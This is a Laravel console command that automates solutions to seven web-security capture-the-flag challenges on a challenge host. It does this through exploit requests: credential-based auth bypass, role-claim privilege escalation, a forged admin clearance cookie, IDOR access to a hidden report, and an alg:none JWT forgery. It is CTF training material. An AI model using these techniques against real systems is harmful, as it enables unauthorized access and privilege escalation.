<?php

namespace App\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Facades\Http;

class CtfSolve extends Command
{
    protected $signature = 'ctf:solve {challenge? : Which challenge to solve (login, escalation, reports, projects, resolve, idor, jwt-forge, all)}';
    protected $description = 'Replay solved challenge payloads to obtain fragments';

    private string $base;
    private string $cookie;

    public function handle()
    {
        $this->base = config('ctf.base_url');
        $this->cookie = config('ctf.resume_code');

        $challenge = $this->argument('challenge') ?? $this->choice(
            'Which challenge?',
            // 'escalation' and 'resolve' added after the fact (solved post-event, see walkthrough PDF)
            ['all', 'login', 'escalation', 'reports', 'projects', 'resolve', 'idor', 'jwt-forge'],
            'all'
        );

        if ($challenge === 'all') {
            $this->solveLogin();
            $this->newLine();
            $this->solveEscalation(); // added in
            $this->newLine();
            $this->solveReports();
            $this->newLine();
            $this->solveProjects();
            $this->newLine();
            $this->solveResolve(); // added in
            $this->newLine();
            $this->solveIdor();
            $this->newLine();
            $this->solveJwtForge();
        } else {
            match ($challenge) {
                'login' => $this->solveLogin(),
                'escalation' => $this->solveEscalation(), // added in
                'reports' => $this->solveReports(),
                'projects' => $this->solveProjects(),
                'resolve' => $this->solveResolve(), // added in
                'idor' => $this->solveIdor(),
                'jwt-forge' => $this->solveJwtForge(),
                default => $this->error("Unknown challenge: {$challenge}"),
            };
        }
    }

    private function http()
    {
        return Http::withCookies([
            'helix_player' => $this->cookie,
        ], 'challenge.qadna.co');
    }

    private function solveLogin()
    {
        $this->info('=== Challenge #1: Login (Auth Bypass) ===');
        $this->line('Technique: Credentials from HTML comment + console + /api/config');

        $response = $this->http()->post("{$this->base}/api/login", [
            'username' => config('ctf.login.username'),
            'password' => config('ctf.login.password'),
            'code' => config('ctf.login.code'),
        ]);

        $data = $response->json();

        if ($data['success'] ?? false) {
            $this->info("Fragment: {$data['fragment_id']}");
            $this->info("Score code: {$data['score_code']}");
            $this->line("JWT: {$data['token']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['Username', config('ctf.login.username') . ' (from <!-- HTML comment -->)'],
                ['Password', config('ctf.login.password') . ' (from ConsoleDecoy in browser console)'],
                ['Code', config('ctf.login.code') . ' (from /api/config sessionSeed)'],
                ['Fragment', $data['score_code']],
            ]);
        } else {
            $this->error("Login failed: " . ($data['message'] ?? 'unknown'));
        }
    }

    private function solveReports()
    {
        $this->info('=== Challenge #4: Reports (Fragment Clue) ===');
        $this->line('Technique: Direct access to /api/fragment-clue?fragment=reports');

        $response = $this->http()->get("{$this->base}/api/fragment-clue", [
            'fragment' => 'reports',
        ]);

        $data = $response->json();

        if (isset($data['score_code'])) {
            $this->info("Fragment: {$data['fragment_id']}");
            $this->info("Score code: {$data['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['Endpoint', '/api/fragment-clue?fragment=reports'],
                ['Fragment', $data['score_code']],
            ]);
        } else {
            $this->error("Failed: " . json_encode($data));
        }
    }

    private function solveProjects()
    {
        $this->info('=== Challenge #3: Projects (Client-mutable clearance cookie) ===');
        $this->line('Technique: Resend GET /api/projects with clearance=admin cookie to unlock locked project 12');

        $response = Http::withCookies([
            'helix_player' => $this->cookie,
            'clearance' => 'admin',
        ], 'challenge.qadna.co')->get("{$this->base}/api/projects");

        $projects = $response->json('projects') ?? [];

        $unlocked = collect($projects)->first(
            fn($p) => isset($p['fragment'], $p['score_code'], $p['fragment_id'])
        );

        if ($unlocked) {
            $this->info("Fragment: {$unlocked['fragment_id']}");
            $this->info("Score code: {$unlocked['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['Cookie', 'clearance=admin (default is "basic" after real login)'],
                ['Endpoint', '/api/projects'],
                ['Unlocked', "#{$unlocked['id']} {$unlocked['name']}"],
                ['Fragment', $unlocked['score_code']],
            ]);
        } else {
            $this->error('Failed: no project exposed fragment fields. Response: ' . json_encode($projects));
        }
    }

    private function solveIdor()
    {
        $this->info('=== Challenge #7: IDOR (Predictable identifier) ===');
        $this->line('Technique: /api/reports leaks nextPageStart=9999; fetch the hidden out-of-range report /api/reports/9999');

        // The public listing returns nextPageStart, which points at a non-public report id.
        $cursor = $this->http()->get("{$this->base}/api/reports")->json('nextPageStart');
        $report = $this->http()->get("{$this->base}/api/reports/{$cursor}")->json();

        if (isset($report['score_code'])) {
            $this->info("Fragment: {$report['fragment_id']}");
            $this->info("Score code: {$report['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['Leaked cursor', "nextPageStart = {$cursor}"],
                ['Hidden report', "#{$cursor} {$report['name']} ({$report['classification']})"],
                ['Endpoint', "/api/reports/{$cursor}"],
                ['Fragment', $report['score_code']],
            ]);
        } else {
            $this->error('Failed: ' . json_encode($report));
        }
    }

    private function solveJwtForge()
    {
        $this->info('=== Challenge #6: JWT Forge (alg:none) ===');
        $this->line('Technique: Forge JWT with alg:none and role:auditor');

        // Build forged JWT with alg:none
        $header = rtrim(strtr(base64_encode(json_encode([
            'alg' => 'none',
            'typ' => 'JWT',
        ])), '+/', '-_'), '=');

        $payload = rtrim(strtr(base64_encode(json_encode([
            'sub' => config('ctf.player_id'),
            'role' => 'auditor',
            'iat' => time(),
            'exp' => time() + 86400,
        ])), '+/', '-_'), '=');

        $forgedToken = "{$header}.{$payload}.";

        $response = $this->http()
            ->withHeaders(['Authorization' => "Bearer {$forgedToken}"])
            ->get("{$this->base}/api/audit-log");

        $data = $response->json();

        if (isset($data['score_code'])) {
            $this->info("Fragment: {$data['fragment_id']}");
            $this->info("Score code: {$data['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['JWT alg', 'none (unsigned token)'],
                ['Role claim', 'auditor'],
                ['Endpoint', '/api/audit-log'],
                ['Fragment', $data['score_code']],
            ]);
        } else {
            $this->error("Failed: " . json_encode($data));
        }
    }

    // ----------------------------------------------------------------------
    // added in — challenges solved after the event, reconstructed from the
    // walkthrough PDF. Kept separate so it's clear these were added later.
    // ----------------------------------------------------------------------

    // added in
    private function solveEscalation()
    {
        $this->info('=== Challenge #2: Privilege Escalation (server trusts client-supplied role) ===');
        $this->line('Technique: POST /api/profile (as viewer) leaks availableRoles:[...,"admin"] + a free accessToken;');
        $this->line('replay it with the leaked X-Access-Token header and an admin role claim.');

        $response = $this->http()
            ->withHeaders(['X-Access-Token' => config('ctf.access_token')])
            ->post("{$this->base}/api/profile", [
                'role' => 'admin',
            ]);

        $data = $response->json();

        if (isset($data['score_code'])) {
            $this->info("Fragment: {$data['fragment_id']}");
            $this->info("Score code: {$data['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['Header', 'X-Access-Token: ' . config('ctf.access_token') . ' (leaked by initial /api/profile)'],
                ['Body', '{"role":"admin"}'],
                ['Endpoint', '/api/profile'],
                ['Fragment', $data['score_code']],
            ]);
        } else {
            $this->error("Failed: " . json_encode($data));
        }
    }

    // added in
    private function solveResolve()
    {
        $this->info('=== Challenge #5: Obfuscated JS Resolve (reverse engineering) ===');
        $this->line('Technique: /analytics-helper.js exposes window._resolve(token, seed) past the obfuscation.');
        $this->line('token = accessToken from #2 (escalation), seed = sessionSeed from #1 (login).');

        // window._resolve(token, seed) posts these to /api/resolve.
        $response = $this->http()->post("{$this->base}/api/resolve", [
            'token' => config('ctf.access_token'), // accessToken from F2
            'seed' => config('ctf.login.code'),    // sessionSeed (QX-7291) from F1
        ]);

        $data = $response->json();

        if (isset($data['score_code'])) {
            $this->info("Fragment: {$data['fragment_id']}");
            $this->info("Score code: {$data['score_code']}");
            $this->newLine();
            $this->table(['Field', 'Value'], [
                ['token', config('ctf.access_token') . ' (accessToken from #2)'],
                ['seed', config('ctf.login.code') . ' (sessionSeed from #1)'],
                ['Endpoint', '/api/resolve'],
                ['Fragment', $data['score_code']],
            ]);
        } else {
            $this->error("Failed: " . json_encode($data));
        }
    }
}
